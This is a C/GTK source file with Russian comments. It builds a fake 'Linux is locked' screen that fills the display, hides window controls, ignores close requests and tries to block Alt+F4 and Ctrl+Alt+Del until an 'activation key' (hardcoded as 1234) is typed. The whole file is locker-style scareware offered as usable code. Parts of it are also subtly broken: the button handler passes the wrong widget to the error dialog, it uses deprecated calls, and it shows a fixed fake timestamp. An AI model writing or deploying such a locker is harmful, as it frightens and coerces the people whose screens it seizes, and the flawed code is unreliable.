#include <gtk/gtk.h>
#include <gdk/gdk.h>
#include <string.h>

// Функция обработки ввода пароля
static void on_password_enter(GtkEntry *entry, gpointer user_data) {
    const gchar *password = gtk_entry_get_text(entry);
    
    // Проверка пароля (для примера: "1234")
    if (strcmp(password, "1234") == 0) {
        gtk_main_quit();
    } else {
        // Очистка поля при неправильном пароле
        gtk_entry_set_text(entry, "");
        
        // Показываем уведомление о неверном пароле
        GtkWidget *dialog = gtk_message_dialog_new(
            GTK_WINDOW(user_data),
            GTK_DIALOG_MODAL,
            GTK_MESSAGE_ERROR,
            GTK_BUTTONS_OK,
            "Неверный пароль. Попробуйте снова."
        );
        gtk_dialog_run(GTK_DIALOG(dialog));
        gtk_widget_destroy(dialog);
    }
}

// Функция для выхода (можно заблокировать)
static gboolean on_key_press(GtkWidget *widget, GdkEventKey *event, gpointer user_data) {
    // Блокируем Alt+F4 и другие комбинации
    if ((event->state & GDK_MOD1_MASK) && event->keyval == GDK_KEY_F4) {
        return TRUE; // Не даем закрыть окно
    }
    if ((event->state & GDK_CONTROL_MASK) && 
        (event->state & GDK_MOD1_MASK) && 
        event->keyval == GDK_KEY_Delete) {
        return TRUE; // Блокируем Ctrl+Alt+Del
    }
    return FALSE;
}

int main(int argc, char *argv[]) {
    gtk_init(&argc, &argv);
    
    // Создание главного окна
    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "Linux заблокирован");
    gtk_window_set_default_size(GTK_WINDOW(window), 800, 600);
    
    // Полноэкранный режим
    gtk_window_fullscreen(GTK_WINDOW(window));
    
    // Отключаем стандартные кнопки управления
    gtk_window_set_decorated(GTK_WINDOW(window), FALSE);
    
    // Блокируем закрытие окна
    g_signal_connect(window, "delete-event", G_CALLBACK(gtk_true), NULL);
    
    // Обработка нажатий клавиш
    g_signal_connect(window, "key-press-event", G_CALLBACK(on_key_press), NULL);
    
    // Основной контейнер
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 20);
    gtk_container_add(GTK_CONTAINER(window), vbox);
    
    // Центрирование через выравнивание
    GtkWidget *align_center = gtk_alignment_new(0.5, 0.5, 0, 0);
    gtk_box_pack_start(GTK_BOX(vbox), align_center, TRUE, TRUE, 0);
    
    // Внутренний контейнер
    GtkWidget *vbox_center = gtk_box_new(GTK_ORIENTATION_VERTICAL, 15);
    gtk_container_add(GTK_CONTAINER(align_center), vbox_center);
    
    // Заголовок
    GtkWidget *title_label = gtk_label_new(NULL);
    gtk_label_set_markup(GTK_LABEL(title_label), 
        "<span font_desc='48' weight='bold'>Linux заблокирован</span>");
    gtk_box_pack_start(GTK_BOX(vbox_center), title_label, FALSE, FALSE, 0);
    
    // Подзаголовок
    GtkWidget *subtitle_label = gtk_label_new(NULL);
    gtk_label_set_markup(GTK_LABEL(subtitle_label), 
        "<span font_desc='14'>Для разблокировки введите ключ активаций линукс</span>");
    gtk_box_pack_start(GTK_BOX(vbox_center), subtitle_label, FALSE, FALSE, 0);
    
    // Контейнер для поля ввода
    GtkWidget *hbox_password = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 10);
    gtk_box_pack_start(GTK_BOX(vbox_center), hbox_password, FALSE, FALSE, 0);
    
    // Метка для поля ввода
    GtkWidget *password_label = gtk_label_new("ключ:");
    gtk_box_pack_start(GTK_BOX(hbox_password), password_label, FALSE, FALSE, 0);
    
    // Поле ввода пароля
    GtkWidget *password_entry = gtk_entry_new();
    gtk_entry_set_visibility(GTK_ENTRY(password_entry), FALSE); // Скрытый ввод
    gtk_entry_set_width_chars(GTK_ENTRY(password_entry), 20);
    gtk_box_pack_start(GTK_BOX(hbox_password), password_entry, FALSE, FALSE, 0);
    
    // Обработка ввода пароля
    g_signal_connect(password_entry, "activate", 
                     G_CALLBACK(on_password_enter), window);
    
    // Кнопка входа
    GtkWidget *enter_button = gtk_button_new_with_label("→");
    gtk_box_pack_start(GTK_BOX(hbox_password), enter_button, FALSE, FALSE, 0);
    
    // Сигнал для кнопки
    g_signal_connect_swapped(enter_button, "clicked", 
                            G_CALLBACK(on_password_enter), password_entry);
    
    // Нижняя панель с информацией
    GtkWidget *bottom_box = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 10);
    gtk_box_pack_end(GTK_BOX(vbox), bottom_box, FALSE, FALSE, 20);
    
    // Информация о пользователе
    GtkWidget *user_info = gtk_label_new(NULL);
    gtk_label_set_markup(GTK_LABEL(user_info), 
        "<span font_desc='10'>Пользователь: root</span>");
    gtk_box_pack_start(GTK_BOX(bottom_box), user_info, FALSE, FALSE, 20);
    
    // Время и дата
    GtkWidget *datetime_label = gtk_label_new(NULL);
    gtk_label_set_markup(GTK_LABEL(datetime_label), 
        "<span font_desc='10'>Дата и время: 2026-02-11 14:30</span>");
    gtk_box_pack_end(GTK_BOX(bottom_box), datetime_label, FALSE, FALSE, 20);
    
    // CSS стилизация
    GtkCssProvider *css_provider = gtk_css_provider_new();
    gtk_css_provider_load_from_data(css_provider,
        "window {"
        "   background-image: linear-gradient(to bottom, #1e3c72, #2a5298);"
        "}"
        "label {"
        "   color: white;"
        "}"
        "entry {"
        "   background-color: rgba(255, 255, 255, 0.2);"
        "   color: white;"
        "   border: 1px solid white;"
        "   border-radius: 3px;"
        "   padding: 8px;"
        "}"
        "button {"
        "   background-color: rgba(255, 255, 255, 0.2);"
        "   color: white;"
        "   border: 1px solid white;"
        "   border-radius: 3px;"
        "   padding: 8px 15px;"
        "}"
        "button:hover {"
        "   background-color: rgba(255, 255, 255, 0.3);"
        "}", -1, NULL);
    
    GdkScreen *screen = gdk_screen_get_default();
    gtk_style_context_add_provider_for_screen(screen, 
        GTK_STYLE_PROVIDER(css_provider),
        GTK_STYLE_PROVIDER_PRIORITY_APPLICATION);
    
    g_object_unref(css_provider);
    
    // Установка фокуса на поле ввода
    gtk_widget_grab_focus(password_entry);
    
    gtk_widget_show_all(window);
    gtk_main();
    
    return 0;
}
